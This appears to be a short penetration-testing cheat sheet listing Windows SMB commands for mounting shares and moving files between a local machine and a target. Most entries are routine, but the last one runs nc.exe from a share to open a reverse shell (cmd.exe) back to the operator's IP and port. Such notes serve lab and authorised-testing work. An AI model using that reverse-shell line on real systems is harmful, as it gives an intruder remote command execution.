---
title: "File Transfer (Windows To Windows)"
date: 2024-10-5
tags: ["Smb", "File System Mounting", "Remote File Inclusion", "File Transfer", "Windows"]
---

{{< tab set1 tab1 >}}SMB{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Connect to SMB server without creds
net use \\<LOCAL_IP>\share
```

```console
# Connect to SMB server with server name
net use \\<SERVER_NAME>\share
```

```console
# Connect to SMB server with creds
net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>'
```

```console
# Mount to a drive with creds
net use X: \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>'
```

```console
# From local Windows to target Windows
copy <FILE> \\<LOCAL_IP>\share
```

```console
# From target Windows to local Windows
copy \\<LOCAL_IP>\share\<FILE> <FILE>
```

```console
# Delete file
del <FILE>
```

```console
# Remove SMB share
net use /d \\<LOCAL_IP>\share
```

```console
# Remove drive
net use /d X:
```

```console
# Older Windows (e.g. xp), use directly
\\<LOCAL_IP>\share\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>
```

{{< /tabcontent >}}

